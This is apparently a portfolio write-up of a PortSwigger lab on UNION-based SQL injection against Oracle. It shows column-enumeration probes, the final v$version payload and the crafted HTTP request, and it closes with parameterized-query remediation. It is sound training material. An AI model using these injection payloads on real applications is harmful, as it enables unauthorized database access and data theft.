# Lab 03: SQL Injection Attack, Querying the Database Type and Version on Oracle

- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (SQLi)
- **Difficulty:** Practitioner
- **OWASP Top 10:** A03:2021 – Injection
- **CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **Author:** Yaseen Khan
- **Date:** November 21, 2026

---

## 1. Objective
Exploit a `UNION`-based SQL injection vulnerability in the product category filter to find out how many columns the query returns, check which columns accept text, and extract the Oracle database version string.

---

## 2. Reconnaissance & Column Enumeration
- **Target Endpoint:** `GET /filter?category=Toys+%26+Games`
- **Vulnerable Parameter:** `category` (URL Query Parameter)

### Step-by-Step Enumeration
1. **Find the Number of Columns (`ORDER BY`):**
   - Tested `' ORDER BY 1--` and `' ORDER BY 2--` $\rightarrow$ both returned **HTTP 200 OK**.
   - Tested `' ORDER BY 3--` $\rightarrow$ returned **HTTP 500 Internal Server Error**.
   - **Result:** The original query returns **2 columns**[cite: 27].
2. **Find Text-Compatible Columns (`DUAL`):**
   - Because Oracle requires a `FROM` table in every `SELECT` statement, tested `' UNION SELECT 'a', 'a' from DUAL--`.
   - The server returned **HTTP 200 OK**, confirming both columns accept string (text) data.

---

## 3. Exploitation & Proof of Concept (PoC)
Oracle stores its version banner inside a built-in view called `v$version` in a column named `banner`. Since our query needs 2 columns, we select `banner` in the first column and `NULL` in the second.

### Final Payload
```sql
' UNION SELECT banner, NULL from v$version--
```
Modified HTTP Request (Burp Repeater)
```
GET /filter?category=Toys+%26+Games' UNION SELECT banner, NULL from v$version-- HTTP/2
Host: 0ac600d9037efaf8806808d500760009.web-security-academy.net
Cookie: session=[REDACTED]
```
Extracted Database Version
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
## Proof of Exploitation Screenshots
1. Confirming 2 Columns (ORDER BY 2--):
 ![Column Enumeration](../screenshots/sqli-03-column.png)

2. Confirming Text Data Types (UNION SELECT 'a', 'a' from DUAL--):
   ![Data Type Enumeration](../screenshots/sqli-03-datatypes.png)

3. Extracting Oracle Version Banner (v$version):
   ![Oracle Version Banner](../screenshots/sqli-03-version.png)

4. Lab Completion Banner:
![PortSwigger Lab Solved Confirmation](../screenshots/sqli-03-solved.png)

## 4. Impact
An attacker can fingerprint the exact database engine and patch level (Oracle 11g 11.2.0.2.0), making it easy to craft database-specific UNION payloads to dump sensitive tables like usernames and passwords.

## 5. Remediation
Primary Fix (Parameterized Queries): Use prepared statements with bound parameters so user input in the category filter is treated strictly as text rather than executable SQL commands:
```
// Secure Java / JDBC Example for Oracle
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM products WHERE category = ?");
stmt.setString(1, category);
ResultSet rs = stmt.executeQuery();
```
Input Validation: Restrict the category parameter against a strict allowlist of valid storefront categories.
